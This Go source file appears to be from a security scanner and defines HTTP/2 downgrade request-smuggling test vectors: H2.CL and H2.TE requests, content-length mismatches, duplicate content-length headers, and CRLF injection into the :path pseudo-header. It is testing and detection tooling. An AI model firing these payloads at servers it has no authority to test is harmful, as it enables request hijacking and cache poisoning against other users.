package vectors

import (
	"github.com/byteoverride/desynctrace/internal/client"
)

type H2Vector struct{}

func NewH2Vector() *H2Vector {
	return &H2Vector{}
}

func (v *H2Vector) Name() string {
	return "H2.CL/TE (HTTP/2 -> HTTP/1.1 Downgrade Smuggling)"
}

func (v *H2Vector) Type() VectorType {
	return H2CL
}

func (v *H2Vector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	payloads := []*client.Request{}

	// H2.CL: Content-Length: 0 in H2 HEADERS but send DATA frame with body
	req1 := &client.Request{
		Method:        "POST",
		URL:           baseReq.URL,
		Headers:       map[string]string{},
		ContentLength: 0,
		Body:          []byte("SMUGGLED"),
	}
	payloads = append(payloads, req1)

	// H2.TE: Inject Transfer-Encoding via H2 (forbidden by spec but some proxies forward)
	req2 := &client.Request{
		Method: "POST",
		URL:    baseReq.URL,
		Headers: map[string]string{
			"transfer-encoding": "chunked",
		},
		Body: []byte("0\r\n\r\nSMUGGLED"),
	}
	payloads = append(payloads, req2)

	return payloads
}

func (v *H2Vector) GenerateRawPayloads(host, path string) []RawPayload {
	var payloads []RawPayload

	// H2.CL payloads require the RawH2Client, so we provide descriptive
	// metadata. The actual raw bytes are H2 frames, not HTTP/1.1 text.
	// The scan engine should detect H2 vector type and use RawH2Client.

	// 1. H2.CL: Content-Length: 0 with body data
	payloads = append(payloads, RawPayload{
		Name:        "h2cl-cl0-with-body",
		Description: "H2.CL: Set content-length: 0 in HEADERS frame but send DATA frame with smuggled request. Backend downgrade creates: POST / HTTP/1.1\\nContent-Length: 0\\n\\nSMUGGLED",
		Technique:   "h2-downgrade-cl",
	})

	// 2. H2.TE: Transfer-Encoding: chunked header
	payloads = append(payloads, RawPayload{
		Name:        "h2te-te-header",
		Description: "H2.TE: Set transfer-encoding: chunked in H2 HEADERS (forbidden by RFC 7540 but proxies may forward). Backend sees chunked body.",
		Technique:   "h2-downgrade-te",
	})

	// 3. H2.CL mismatch: Content-Length doesn't match DATA frame length
	payloads = append(payloads, RawPayload{
		Name:        "h2cl-length-mismatch",
		Description: "H2.CL: content-length: 5 but DATA frame has 50 bytes. Backend reads 5 bytes, 45 bytes remain as next request.",
		Technique:   "h2-cl-mismatch",
	})

	// 4. H2 header injection via :path pseudo-header with CRLF
	payloads = append(payloads, RawPayload{
		Name:        "h2-path-injection",
		Description: "H2: Inject CRLF into :path pseudo-header. Downgraded H1: GET /<CRLF>Injected-Header: value HTTP/1.1",
		Technique:   "h2-pseudo-injection",
	})

	// 5. H2 multiple content-length headers
	payloads = append(payloads, RawPayload{
		Name:        "h2-double-cl",
		Description: "H2: Two content-length headers with different values. Proxy may forward both to H1 backend.",
		Technique:   "h2-double-cl",
	})

	return payloads
}

func (v *H2Vector) Verify(resp *client.Response) bool {
	return resp.StatusCode >= 400
}
